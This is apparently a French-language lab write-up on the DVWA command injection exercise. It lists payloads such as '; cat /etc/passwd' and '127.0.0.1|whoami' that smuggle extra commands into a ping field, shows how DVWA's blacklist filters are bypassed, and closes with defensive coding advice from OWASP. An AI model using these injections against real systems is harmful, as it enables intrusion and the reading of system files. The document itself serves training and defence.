
## 📄 `ctfs/dvwa/command-injection.md`

# DVWA Command Injection (Low → Medium → High)

## 🎯 Low (Injection basique)

### Test manuel
```
127.0.0.1 ; whoami
127.0.0.1 && ls -la
```
**Réponse** : `www-data`

**Screenshot** : [ping + whoami]
```
### Payloads (à tester)
; cat /etc/passwd
| whoami  
&& id
```


## 📈 Medium (Filtre ; &&)

### Bypass le filtre
```
127.0.0.1 | whoami
127.0.0.1 || ls -la
;ls KO
```

**Filtrage dans le code Source** : 
```
  // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );
```


## 🔥 High (Filtre avancé)

### Bypass espaces
```
127.0.0.1|whoami
127.0.0.1|id
127.0.0.1|cat /etc/passwd

**Filtrage dans le code Source** : 
 // Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );
```

**Screenshot** : [bypass réussi]

## 🛡️ Bonnes pratiques (Défenseurs)

### 1. Éviter les appels système
```php
// ❌ DANGEREUX
system("ping " . $_GET['ip']);

// ✅ SÉCURISÉ
### 1. Echapper les entrées
$ip = filter_var($_GET['ip'], FILTER_VALIDATE_IP);
if ($ip) {
    exec("ping -c 1 $ip", $output); // + escapeshellarg()
}
```

### 2. Whitelist IP, validation des entrées
```php
$allowed_ips = ['127.0.0.1', '8.8.8.8'];
if (!in_array($_GET['ip'], $allowed_ips)) {
    die("IP non autorisée");
}
```

### 3. APIs natives PHP
```php
// Pas de ping → APIs réseau
$status = @fsockopen($ip, 80, $errno, $errstr, 3);
regex ^[a-zA-Z0-9.-]+$
```
### 4. Principe du moindre privilège
L’application ne doit jamais tourner en root
Limiter : accès fichiers, droits système
Utiliser : comptes dédiés, conteneurs (Docker), sandbox

### 5. OWASP
- **Ne jamais** passer input utilisateur à `system/exec/shell_exec`
- **Paramétrer** : `escapeshellarg()`
- **Least privilege** : conteneur sans shell [web:258][web:259]
- **Toujours revalider côté backend**
- **Désactiver** fonctions dangereuses (PHP exec, shell_exec)

**Références**
OWASP – Command Injection
OWASP Top 10 → A03: Injection
OWASP Testing Guide → Injection Testing


